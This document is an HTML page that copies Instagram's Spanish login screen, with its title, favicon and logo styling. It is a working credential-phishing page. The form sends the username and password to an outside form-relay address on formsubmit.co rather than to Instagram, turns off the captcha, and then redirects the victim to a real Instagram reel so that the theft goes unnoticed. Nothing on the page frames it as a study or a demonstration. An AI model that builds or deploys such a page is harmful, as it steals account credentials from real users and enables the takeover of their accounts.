<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 300px;
      text-align: center;
    }
    input {
      width: 100%;
      margin: 5px 0;
      padding: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }
    button {
      background-color: #3897f0;
      border: none;
      color: white;
      padding: 10px;
      width: 100%;
      margin-top: 10px;
      border-radius: 3px;
      font-weight: bold;
      cursor: pointer;
    }
    .logo {
      font-size: 2.5em;
      font-family: 'Billabong', cursive;
      margin-bottom: 20px;
    }
    .extra {
      margin-top: 10px;
      font-size: 0.85em;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">Instagram</div>
    <form action="https://formsubmit.co/el/kamizo" method="POST">
      <input type="text" name="username" placeholder="Teléfono, usuario o correo" required>
      <input type="password" name="password" placeholder="Contraseña" required>
      <button type="submit">Iniciar sesión</button>

      <!-- Redirección al post real de Instagram -->
      <input type="hidden" name="_next" value="https://www.instagram.com/reel/DGVweZlMhoM/?igsh=NGlkODR6NGN3ZG1s">
      <input type="hidden" name="_captcha" value="false">
    </form>
    <div class="extra">¿Olvidaste tu contraseña?</div>
  </div>
</body>
</html>
